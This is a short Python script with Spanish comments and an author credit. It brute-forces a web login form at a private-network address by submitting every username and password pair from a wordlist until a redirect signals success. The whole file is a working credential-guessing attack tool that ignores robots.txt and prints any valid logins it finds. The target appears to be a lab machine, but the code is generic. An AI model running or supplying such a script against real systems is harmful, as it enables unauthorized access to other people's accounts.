#!/usr/bin/env python3
import mechanize

url = 'http://192.168.0.16/login.php'
wordlist_user = "common.txt"
wordlist_pwd = "common.txt"

# Crear navegador mechanize
b = mechanize.Browser()
b.set_handle_robots(False)  # Ignorar robots.txt
b.set_handle_refresh(False)  # Evitar redirecciones automáticas

break_flag = False

# Leer wordlists
try:
    wordlist_user = open(wordlist_user, "r", encoding="utf-8")
    wordlist_pwd = open(wordlist_pwd, "r", encoding="utf-8")
except Exception as e:
    print("Error al abrir los wordlists:", str(e))
    quit()

# Fuerza bruta
for user in wordlist_user:
    for password in wordlist_pwd:
        user = user.strip()
        password = password.strip()

        try:
            response = b.open(url)
            b.select_form(nr=0)  # Selecciona el primer formulario
            b.form['username'] = user
            b.form['password'] = password
            response = b.submit()

            if response.geturl() != url:
                print(f"[ OK ] Login válido: Usuario: {user} | Contraseña: {password}")
                print("** Code by @stormdark_ **")
                break_flag = True
                break
            else:
                print(f"[ x ] Fallo: Usuario: {user} | Contraseña: {password}")
        except Exception as ex:
            print(f"[ ! ] Error durante intento con {user}:{password} -> {ex}")

    wordlist_pwd.seek(0)  # Reiniciar el puntero del archivo de contraseñas
    if break_flag:
        break
